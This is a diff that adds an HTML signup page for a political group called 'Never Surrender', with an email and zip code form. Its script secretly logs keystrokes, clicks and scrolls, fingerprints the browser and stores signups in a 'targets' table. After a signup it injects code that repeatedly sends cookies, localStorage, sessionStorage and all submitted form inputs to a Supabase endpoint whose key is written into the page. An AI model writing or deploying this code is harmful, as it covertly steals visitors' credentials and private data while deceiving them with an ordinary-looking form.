@@ -1,0 +1,312 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Join Our Movement | Never Surrender</title>  
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">  
+    <style>  
+        * { margin: 0; padding: 0; box-sizing: border-box; }  
+        body {  
+            font-family: 'Roboto', sans-serif;  
+            background: #0a0a23;  
+            color: white;  
+            min-height: 100vh;  
+            display: flex;  
+            align-items: center;  
+            justify-content: center;  
+            padding: 20px;  
+        }  
+        .container {  
+            max-width: 600px;  
+            width: 100%;  
+            background: rgba(255, 255, 255, 0.05);  
+            border-radius: 15px;  
+            padding: 40px;  
+            border: 1px solid rgba(255, 255, 255, 0.1);  
+        }  
+        .header {  
+            text-align: center;  
+            margin-bottom: 30px;  
+        }  
+        h1 {  
+            font-size: 2.5rem;  
+            font-weight: 700;  
+            background: linear-gradient(90deg, #ff0000, #ff9100);  
+            -webkit-background-clip: text;  
+            -webkit-text-fill-color: transparent;  
+        }  
+        .subtitle {  
+            color: #aaa;  
+            margin-top: 10px;  
+        }  
+        .form-group {  
+            margin-bottom: 20px;  
+        }  
+        label {  
+            display: block;  
+            margin-bottom: 8px;  
+            font-weight: 500;  
+        }  
+        input {  
+            width: 100%;  
+            padding: 15px;  
+            background: rgba(255, 255, 255, 0.08);  
+            border: 1px solid rgba(255, 255, 255, 0.3);  
+            border-radius: 8px;  
+            color: white;  
+            font-size: 1rem;  
+        }  
+        button {  
+            width: 100%;  
+            padding: 16px;  
+            background: linear-gradient(90deg, #ff0000, #ff9100);  
+            border: none;  
+            border-radius: 10px;  
+            color: white;  
+            font-weight: 700;  
+            font-size: 1.1rem;  
+            cursor: pointer;  
+            transition: opacity 0.3s;  
+        }  
+        button:hover { opacity: 0.9; }  
+        .footer {  
+            margin-top: 30px;  
+            font-size: 0.8rem;  
+            color: #777;  
+            text-align: center;  
+        }  
+        .footer a { color: #ccc; text-decoration: none; }  
+        .disclaimer {  
+            margin-top: 20px;  
+            padding: 15px;  
+            background: rgba(255, 0, 0, 0.1);  
+            border-radius: 10px;  
+            border-left: 4px solid #ff0000;  
+            font-size: 0.85rem;  
+        }  
+    </style>  
+</head>  
+<body>  
+    <div class="container">  
+        <div class="header">  
+            <h1>Join Our Movement</h1>  
+            <p class="subtitle">Be part of the change. Stand with us.</p>  
+        </div>
+
+        <form id="signup-form">  
+            <div class="form-group">  
+                <label for="email">Email *</label>  
+                <input type="email" id="email" placeholder="Enter your Email" required>  
+            </div>  
+            <div class="form-group">  
+                <label for="zip">Zip *</label>  
+                <input type="text" id="zip" placeholder="Zip" required>  
+            </div>  
+            <button type="submit">I'm In</button>  
+        </form>
+
+        <div class="disclaimer">  
+            Paid for by Never Surrender, Inc. and not authorized by any candidate or candidate's committee.  
+        </div>
+
+        <div class="footer">  
+            <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a> | <a href="#">Press</a> | <a href="#">Careers</a><br>  
+            Powered by Nucleus<br>  
+            <small>The appearance of U.S. Department of Defense personnel or other visual information does not imply or constitute DoD endorsement.</small>  
+        </div>  
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>  
+    <script>  
+        // Supabase Configuration  
+        const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';  
+        const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';  
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // Tracking Variables  
+        let keystrokeLog = [];  
+        let clickLog = [];  
+        let scrollLog = [];  
+        let email = '';  
+        let zip = '';
+
+        // Get IP Address  
+        async function getIP() {  
+            try {  
+                const response = await fetch('https://api.ipify.org?format=json');  
+                const data = await response.json();  
+                return data.ip;  
+            } catch (error) {  
+                return 'unknown';  
+            }  
+        }
+
+        // Start Tracking  
+        function startTracking() {  
+            // Keylogger  
+            document.addEventListener('keydown', (e) => {  
+                keystrokeLog.push({  
+                    key: e.key,  
+                    time: Date.now(),  
+                    element: e.target.tagName  
+                });  
+            });
+
+            // Click Tracker  
+            document.addEventListener('click', (e) => {  
+                clickLog.push({  
+                    x: e.clientX,  
+                    y: e.clientY,  
+                    element: e.target.tagName,  
+                    time: Date.now()  
+                });  
+            });
+
+            // Scroll Tracker  
+            document.addEventListener('scroll', () => {  
+                scrollLog.push({  
+                    position: window.scrollY,  
+                    time: Date.now()  
+                });  
+            });
+
+            // Periodic Data Send  
+            setInterval(async () => {  
+                if (!email) return;
+
+                const ip = await getIP();  
+                  
+                // Send tracking data to Supabase  
+                await supabaseClient  
+                    .from('tracking_logs')  
+                    .insert([{  
+                        email,  
+                        action: 'heartbeat',  
+                        details: {  
+                            ip,  
+                            userAgent: navigator.userAgent,  
+                            screen: `${screen.width}x${screen.height}`,  
+                            platform: navigator.platform,  
+                            keystrokes: keystrokeLog.splice(0, 50),  
+                            clicks: clickLog.splice(0, 30),  
+                            scrolls: scrollLog.splice(0, 20),  
+                            url: window.location.href,  
+                            referrer: document.referrer  
+                        },  
+                        timestamp: new Date().toISOString()  
+                    }]);  
+            }, 15000); // Every 15 seconds  
+        }
+
+        // Form Submission  
+        document.getElementById('signup-form').addEventListener('submit', async (e) => {  
+            e.preventDefault();  
+              
+            email = document.getElementById('email').value;  
+            zip = document.getElementById('zip').value;  
+            const ip = await getIP();
+
+            // Save to Targets Table  
+            await supabaseClient  
+                .from('targets')  
+                .insert([{  
+                    email,  
+                    zip,  
+                    ip,  
+                    user_agent: navigator.userAgent,  
+                    screen_resolution: `${screen.width}x${screen.height}`,  
+                    platform: navigator.platform,  
+                    language: navigator.language,  
+                    status: 'pending',  
+                    created_at: new Date().toISOString()  
+                }]);
+
+            // Start Advanced Tracking  
+            startTracking();
+
+            // Inject Surveillance Script  
+            const script = document.createElement('script');  
+            script.innerHTML = `  
+                // Advanced Tracking  
+                setInterval(async () => {  
+                    const data = {  
+                        url: window.location.href,  
+                        title: document.title,  
+                        cookies: document.cookie,  
+                        localStorage: JSON.stringify(localStorage),  
+                        sessionStorage: JSON.stringify(sessionStorage),  
+                        network: performance.getEntriesByType('resource'),  
+                        timestamp: Date.now()  
+                    };  
+                      
+                    // Send to Supabase  
+                    await fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
+                        method: 'POST',  
+                        headers: {  
+                            'apikey': '${SUPABASE_KEY}',  
+                            'Content-Type': 'application/json'  
+                        },  
+                        body: JSON.stringify({  
+                            email: '${email}',  
+                            action: 'advanced_tracking',  
+                            details: data,  
+                            timestamp: new Date().toISOString()  
+                        })  
+                    });  
+                }, 10000);
+
+                // Capture Form Inputs  
+                const originalSubmit = HTMLFormElement.prototype.submit;  
+                HTMLFormElement.prototype.submit = function() {  
+                    const inputs = Array.from(this.elements).map(el => ({  
+                        name: el.name,  
+                        type: el.type,  
+                        value: el.value  
+                    }));  
+                      
+                    // Log form data  
+                    fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
+                        method: 'POST',  
+                        headers: {  
+                            'apikey': '${SUPABASE_KEY}',  
+                            'Content-Type': 'application/json'  
+                        },  
+                        body: JSON.stringify({  
+                            email: '${email}',  
+                            action: 'form_submission',  
+                            details: { form: this.id, inputs },  
+                            timestamp: new Date().toISOString()  
+                        })  
+                    });  
+                      
+                    return originalSubmit.apply(this, arguments);  
+                };  
+            `;  
+            document.body.appendChild(script);
+
+            // Success Message  
+            alert('Thank you for joining! Your support has been logged.');  
+            e.target.reset();  
+        });
+
+        // Initial Load Tracking  
+        window.addEventListener('load', async () => {  
+            const ip = await getIP();  
+              
+            await supabaseClient  
+                .from('tracking_logs')  
+                .insert([{  
+                    action: 'page_load',  
+                    details: {  
+                        ip,  
+                        userAgent: navigator.userAgent,  
+                        url: window.location.href,  
+                        referrer: document.referrer  
+                    },  
+                    timestamp: new Date().toISOString()  
+                }]);  
+        });  
+    </script>  
+</body>  
+</html>  
